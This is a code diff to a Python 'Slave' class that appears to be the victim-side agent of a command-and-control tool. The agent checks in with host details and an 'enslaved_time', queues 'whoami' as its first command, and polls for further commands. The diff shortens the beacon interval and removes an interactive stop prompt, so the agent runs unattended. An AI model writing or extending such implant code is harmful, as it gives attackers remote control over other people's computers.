@@ -17,6 +17,7 @@ class Json_Format(BaseModel):
     completed_commands: list
     pending_commands:list
     enslaved_time: datetime
+    last_ping: str  
 
 class Slave(object):
     username = "admin"
@@ -50,7 +51,7 @@ class Slave(object):
 
     def initial_check_in(self):
         random_num = random.randint(10000,90000)
-        self.init_checkin = Json_Format(agent_id=random_num, OS=self.os, ip=self.ip, user=self.user, completed_commands=["initial_check_in"], pending_commands=["whoami"], enslaved_time=datetime.now())
+        self.init_checkin = Json_Format(agent_id=random_num, OS=self.os, ip=self.ip, user=self.user, completed_commands=["initial_check_in"], pending_commands=["whoami"], enslaved_time=datetime.now(),last_ping='')
         self.init_checkin = jsonable_encoder(self.init_checkin)
         print(self.init_checkin)
         print(type(self.init_checkin))
@@ -89,12 +90,8 @@ class Slave(object):
         slave.connect_db()
         slave.initial_check_in()
         while True:
-            sleep(10)
+            sleep(3)
             slave.check_for_commands()
-            ask = input("continue? y/n")
-            if ask == "y":
-                sys.exit(0)
-
 
 
 if __name__ == "__main__":
